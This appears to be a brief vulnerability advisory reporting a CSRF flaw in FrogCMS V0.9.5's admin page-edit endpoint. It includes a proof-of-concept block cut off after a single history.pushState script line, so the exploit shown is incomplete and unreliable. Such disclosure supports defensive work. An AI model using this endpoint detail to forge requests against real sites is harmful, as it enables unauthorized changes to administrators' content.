
target:https://github.com/philippe/FrogCMS
version: V0.9.5

FrogCMS V0.9.5 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component  http://127.0.0.1:80/admin/?/page/edit/10

POC:
```
<html>

  <body>
  <script>history.pushState('', '', '/')</script>
```
